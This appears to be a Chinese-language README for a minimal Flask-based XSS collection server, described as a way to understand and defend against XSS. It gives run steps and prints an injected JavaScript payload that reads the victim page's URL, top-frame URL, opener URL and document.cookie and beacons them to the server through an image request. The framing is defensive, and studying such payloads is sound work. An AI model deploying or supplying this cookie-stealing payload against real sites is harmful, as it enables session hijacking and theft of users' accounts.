##Xss服务端代码，简易实现，用于理解、分析以便防御xss攻击##


### 如何使用

1. 运行环境  
	python2.7   
	Flask  `pip install flask`    
	
2. 运行服务	`python xss.py`
3. 访问生成xss [http://127.0.0.1/g.js](http://127.0.0.1/g.js)
4. xss会主支请求[http://127.0.0.1/req](http://127.0.0.1/req)将用户浏览器当前页面的信息打印通过参数传递过来    
    location=?   
	toplocation=?   
	cookie=?   
    opener=?

### 函数
1. 主要js代码 

```javascript
(function(){
	(new Image()).src='location='+escape((function(){try{return document.location.href}catch(e){return ''}})())
	+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())
	+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())
	+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());
})()
```
